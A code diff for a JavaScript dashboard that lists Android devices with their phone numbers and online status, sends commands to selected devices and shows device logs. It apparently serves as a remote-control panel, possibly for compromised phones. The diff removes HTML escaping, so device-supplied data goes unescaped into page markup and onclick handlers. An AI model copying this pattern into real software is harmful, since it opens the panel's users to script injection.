@@ -1,172 +1,117 @@
 const DevicesManager = {
-    currentPage: 1,
-    perPage: 20,
-    allDevices: [],
-    filteredDevices: [],
+    selectedDevices: [],
     
     async load() {
-        const search = document.getElementById('deviceSearch').value;
+        const perPage = 20;
+        const page = 1;
+        const searchInput = document.getElementById('deviceSearch');
+        const search = searchInput ? searchInput.value : '';
+        
         try {
-            const data = await API.getDevices(this.currentPage, this.perPage, search);
+            const data = await API.getDevices(page, perPage, search);
+            const tbody = document.getElementById('devicesTableBody');
+            if (!tbody) return;
+            tbody.innerHTML = '';
             
-            if (data.error) {
-                console.error('API error:', data.error);
-                this.allDevices = [];
-                this.filteredDevices = [];
-                this.render();
+            if (!data.devices || data.devices.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="6" style="text-align:center; padding:2rem; color:var(--text-muted)">No devices found</td></tr>';
                 return;
             }
-            
-            this.allDevices = Array.isArray(data.devices) ? data.devices : [];
-            this.filteredDevices = this.allDevices;
-            this.render();
-            
-            const totalPages = data.totalPages || 0;
-            const total = data.total || 0;
-            Pagination.render('devicesPagination', this.currentPage, totalPages, total, (page) => {
-                this.currentPage = page;
-                this.load();
+
+            data.devices.forEach(dev => {
+                const tr = document.createElement('tr');
+                tr.style.borderBottom = '1px solid var(--border)';
+                
+                // Status calculation (online if seen in last 2 mins)
+                const isOnline = dev.online && (new Date() - new Date(dev.online) < 120000);
+                
+                tr.innerHTML = `
+                    <td style="padding:1rem"><input type="checkbox" class="device-checkbox" value="${dev.android_id}" onchange="DevicesManager.updateSelection()"></td>
+                    <td><code style="color:var(--primary)">${dev.android_id}</code></td>
+                    <td>${dev.model || 'Unknown'}</td>
+                    <td>${dev.phone_numbers || '-'}</td>
+                    <td><span style="color:${isOnline ? 'var(--success)' : 'var(--text-muted)'}">${isOnline ? '● Online' : '○ Offline'}</span></td>
+                    <td><button onclick="showCommandModal('${dev.android_id}')" class="btn-primary" style="padding:0.4rem 0.8rem; font-size:0.8rem">CMD</button></td>
+                `;
+                tbody.appendChild(tr);
             });
-            DeviceCountManager.update();
-        } catch (error) {
-            console.error('Error loading devices:', error);
-            this.allDevices = [];
-            this.filteredDevices = [];
-            this.render();
+        } catch (err) {
+            console.error('Error loading devices:', err);
         }
     },
-    
-    render() {
-        const tbody = document.getElementById('devicesTableBody');
-        if (!tbody) return;
-        
-        tbody.innerHTML = '';
-        
-        if (!Array.isArray(this.filteredDevices) || this.filteredDevices.length === 0) {
-            const tr = document.createElement('tr');
-            tr.innerHTML = '<td colspan="6" style="text-align: center; padding: 20px;">No devices found</td>';
-            tbody.appendChild(tr);
-            this.updateSelectAllState();
-            return;
-        }
-        
-        this.filteredDevices.forEach(device => {
-            if (!device) return;
-            
-            const tr = document.createElement('tr');
-            const androidId = String(device.android_id || '');
-            const onlineDate = device.online ? new Date(device.online) : null;
-            const online = onlineDate && !isNaN(onlineDate.getTime()) 
-                ? onlineDate > new Date(Date.now() - 1 * 60 * 1000)
-                : false;
-            const onlineText = online ? 'Online' : 'Offline';
-            const onlineClass = online ? 'online' : 'offline';
-            
-            const model = String(device.model || '-').substring(0, 100);
-            const phoneNumbers = String(device.phone_numbers || '-').substring(0, 100);
-            const cmd = String(device.cmd || '-').substring(0, 200);
-            
-            tr.innerHTML = `
-                <td class="checkbox-cell">
-                    <input type="checkbox" class="device-checkbox" value="${androidId.replace(/"/g, '&quot;')}" onchange="DevicesManager.updateSelectAllState()">
-                </td>
-                <td><span class="android-id">${androidId.substring(0, 50)}</span></td>
-                <td>${model.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</td>
-                <td><span class="phone-numbers">${phoneNumbers.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</span></td>
-                <td><span class="${onlineClass}">${onlineText}</span></td>
-                <td class="command-cell">${cmd.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</td>
-            `;
-            tbody.appendChild(tr);
-        });
-        
-        this.updateSelectAllState();
-    },
-    
-    filter() {
-        this.currentPage = 1;
-        this.load();
-    },
-    
-    selectAll() {
-        document.querySelectorAll('.device-checkbox').forEach(cb => {
-            cb.checked = true;
-            cb.closest('tr').classList.add('selected');
-        });
-        document.getElementById('selectAllCheckbox').checked = true;
-        this.updateSelectAllState();
-    },
-    
-    deselectAll() {
-        document.querySelectorAll('.device-checkbox').forEach(cb => {
-            cb.checked = false;
-            cb.closest('tr').classList.remove('selected');
-        });
-        document.getElementById('selectAllCheckbox').checked = false;
-        this.updateSelectAllState();
-    },
-    
-    toggleSelectAll() {
-        const selectAll = document.getElementById('selectAllCheckbox').checked;
-        document.querySelectorAll('.device-checkbox').forEach(cb => {
-            cb.checked = selectAll;
-            if (selectAll) {
-                cb.closest('tr').classList.add('selected');
-            } else {
-                cb.closest('tr').classList.remove('selected');
-            }
-        });
-        this.updateSelectAllState();
-    },
-    
-    updateSelectAllState() {
-        const checkboxes = document.querySelectorAll('.device-checkbox');
-        const checked = document.querySelectorAll('.device-checkbox:checked');
-        document.getElementById('selectAllCheckbox').checked = checkboxes.length === checked.length;
-        
+
+    updateSelection() {
+        const checkboxes = document.querySelectorAll('.device-checkbox:checked');
+        this.selectedDevices = Array.from(checkboxes).map(cb => cb.value);
         const sendBtn = document.getElementById('sendCommandBtn');
-        sendBtn.disabled = checked.length === 0;
-        
-        checkboxes.forEach(cb => {
-            if (cb.checked) {
-                cb.closest('tr').classList.add('selected');
-            } else {
-                cb.closest('tr').classList.remove('selected');
-            }
-        });
+        if (sendBtn) sendBtn.disabled = this.selectedDevices.length === 0;
     },
-    
+
+    selectAll() {
+        document.querySelectorAll('.device-checkbox').forEach(cb => cb.checked = true);
+        this.updateSelection();
+    },
+
+    toggleSelectAll() {
+        const master = document.getElementById('selectAllCheckbox');
+        if (!master) return;
+        document.querySelectorAll('.device-checkbox').forEach(cb => cb.checked = master.checked);
+        this.updateSelection();
+    },
+
     getSelectedDevices() {
-        return Array.from(document.querySelectorAll('.device-checkbox:checked'))
-            .map(cb => cb.value);
+        return this.selectedDevices;
     },
-    
-    async sendCommand(command) {
-        const selectedDevices = this.getSelectedDevices();
-        
-        if (selectedDevices.length === 0) {
-            alert('Please select at least one device');
-            return;
-        }
-        
-        if (!command || !command.trim()) {
-            alert('Please enter a command');
-            return;
-        }
-        
-        try {
-            const data = await API.sendCommand(selectedDevices, command.trim());
-            if (data.success) {
-                alert(`Command sent successfully to ${data.updated} device(s)`);
-                closeCommandModal();
-                this.deselectAll();
-                this.load();
-            } else {
-                alert('Error: ' + (data.error || 'Failed to send command'));
-            }
-        } catch (error) {
-            console.error('Error sending command:', error);
-            alert('Error sending command');
-        }
+
+    filter() {
+        this.load();
     }
 };
 
+const LogsManager = {
+    async load() {
+        const searchInput = document.getElementById('logSearch');
+        const search = searchInput ? searchInput.value : '';
+        try {
+            const data = await API.getLogs(search);
+            const tbody = document.getElementById('logsTableBody');
+            if (!tbody) return;
+            tbody.innerHTML = '';
+            
+            if (!data.logs || data.logs.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="3" style="text-align:center; padding:2rem; color:var(--text-muted)">No logs found</td></tr>';
+                return;
+            }
+
+            data.logs.forEach(log => {
+                const tr = document.createElement('tr');
+                tr.style.borderBottom = '1px solid var(--border)';
+                tr.innerHTML = `
+                    <td style="padding:1rem; color:var(--text-muted); width:150px"><code>${log.android_id}</code></td>
+                    <td style="padding:1rem">${log.log}</td>
+                    <td style="padding:1rem; font-size:0.8rem; color:var(--text-muted); width:180px">${log.created_at}</td>
+                `;
+                tbody.appendChild(tr);
+            });
+        } catch (err) {
+            console.error('Error loading logs:', err);
+        }
+    },
+    filter() { this.load(); }
+};
+
+const DeviceCountManager = {
+    async update() {
+        try {
+            const data = await API.getDeviceCount();
+            const total = document.getElementById('deviceCount');
+            const online = document.getElementById('onlineCount');
+            const offline = document.getElementById('offlineCount');
+            if (total) total.textContent = data.total;
+            if (online) online.textContent = data.online;
+            if (offline) offline.textContent = data.offline;
+        } catch (err) {
+            console.error('Error updating stats:', err);
+        }
+    }
+};
